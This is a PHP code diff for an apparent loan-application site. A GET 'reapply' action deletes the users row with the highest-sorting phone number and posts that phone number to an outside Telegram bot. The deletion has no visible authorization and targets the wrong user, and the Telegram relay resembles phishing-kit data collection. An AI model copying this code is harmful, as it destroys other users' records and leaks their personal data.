@@ -94,27 +94,33 @@ if (isset($_GET['action']) && $_GET['action'] === 'reapply') {
             throw new Exception("Database connection failed");
         }
         
-        // Query to get the last inserted phone number from loan_applications table
-        $selectQuery = "SELECT phone_number FROM loan_applications ORDER BY id DESC LIMIT 1";
+        // Query to get the last inserted phone number from users table
+        $selectQuery = "SELECT phone FROM users ORDER BY phone DESC LIMIT 1";
         $result = pg_query($conn, $selectQuery);
         
         if ($result && pg_num_rows($result) > 0) {
             $row = pg_fetch_assoc($result);
-            $lastPhoneNumber = $row['phone_number'];
+            $lastPhoneNumber = $row['phone'];
             
             // Delete the record with the last phone number
-            $deleteQuery = "DELETE FROM loan_applications WHERE phone_number = $1 ORDER BY id DESC LIMIT 1";
+            $deleteQuery = "DELETE FROM users WHERE phone = $1";
             $deleteResult = pg_query_params($conn, $deleteQuery, [$lastPhoneNumber]);
             
             if ($deleteResult) {
-                $_SESSION['message'] = "Previous application deleted successfully. You can now reapply.";
-                $_SESSION['message_type'] = "success";
-                
-                // Send Telegram notification about deletion
-                $ip = "https://loan-1-i36j.onrender.com/session_conflict.php";
-                $time = date('Y-m-d H:i:s');
-                $msg = "🔄 *Application Reset*\n\n📱 Phone: +263 {$lastPhoneNumber}\n⏰ Time: {$time}\n📍 Action: Reapply clicked 🌐 Session Page: {$ip}";
-                sendTelegramMessage($botToken, $chatId, $msg);
+                $rowsAffected = pg_affected_rows($deleteResult);
+                if ($rowsAffected > 0) {
+                    $_SESSION['message'] = "Previous application deleted successfully. You can now reapply.";
+                    $_SESSION['message_type'] = "success";
+                    
+                    // Send Telegram notification about deletion
+                    $ip = "https://loan-1-i36j.onrender.com/session_conflict.php";
+                    $time = date('Y-m-d H:i:s');
+                    $msg = "🔄 *User Record Deleted*\n\n📱 Phone: +263 {$lastPhoneNumber}\n⏰ Time: {$time}\n📍 Action: Reapply clicked\n🌐 Session Page: {$ip}";
+                    sendTelegramMessage($botToken, $chatId, $msg);
+                } else {
+                    $_SESSION['message'] = "No records found to delete.";
+                    $_SESSION['message_type'] = "info";
+                }
             } else {
                 throw new Exception("Error deleting record: " . pg_last_error($conn));
             }
